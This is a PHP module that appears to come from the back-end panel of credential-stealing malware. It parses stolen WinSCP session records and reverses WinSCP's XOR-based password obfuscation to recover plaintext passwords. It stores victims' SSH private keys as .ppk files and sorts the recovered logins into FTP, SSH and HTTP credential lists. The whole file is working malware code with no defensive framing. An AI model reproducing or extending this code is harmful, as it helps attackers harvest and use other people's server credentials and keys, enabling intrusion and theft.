<?php
class Module_winscp extends Module_ //XOR
{
	private function Decrypt($Host, $User, $Password)
	{
		if (!strlen($Password))
			return '';

		$Password = hex2bin($Password);

		if ($Password === false)
		{
			return '';
		}

		for ($i = 0; $i < strlen($Password); $i++)
			$Password[$i] = chr(ord($Password[$i]) ^ 92);

		$blen = ord($Password[2]);
		$bskip = ord($Password[3]);

		$Password = substr($Password, 4);
		$Password = substr($Password, $bskip);
		$Result = substr($Password, 0, $blen);

		$blen = strlen($Host) + strlen($User);
		if (substr($Result, 0, $blen) == $User.$Host)
			return substr($Result, $blen);
		
		return '';
	}
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
			case 0:
			{
				$stream = new Stream($Data, strlen($Data));

				while(TRUE)
				{
					$Host	= $stream->getSTRING_();
					if($Host == NULL)
						break;
					
					$User 	= $stream->getSTRING_();
					$Pass	= $stream->getSTRING_();
					$Prot 	= $stream->getDWORD();
					$Port	= $stream->getDWORD();
					$PKey 	= $stream->getBINARY_();

					if($PKey != NULL)
					{
						if($Port == 22 || $Port == 0)
							$Port = '';
						
						$this->insert_downloads($User . "@" . $Host . $Port . ".ppk", $PKey);
					}
					else if($Prot == 6)
					{
						$Pass = $this->Decrypt($Host, $User, $Pass);
						$this->add_http($Host, $User, $Pass);
					}
					else
					{
						$Pass = $this->Decrypt($Host, $User, $Pass);
						$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot != 5), $Port), $User, $Pass);
					}
				}

				break;
			}
        default:
            return FALSE;
        }

        return TRUE;
    }
}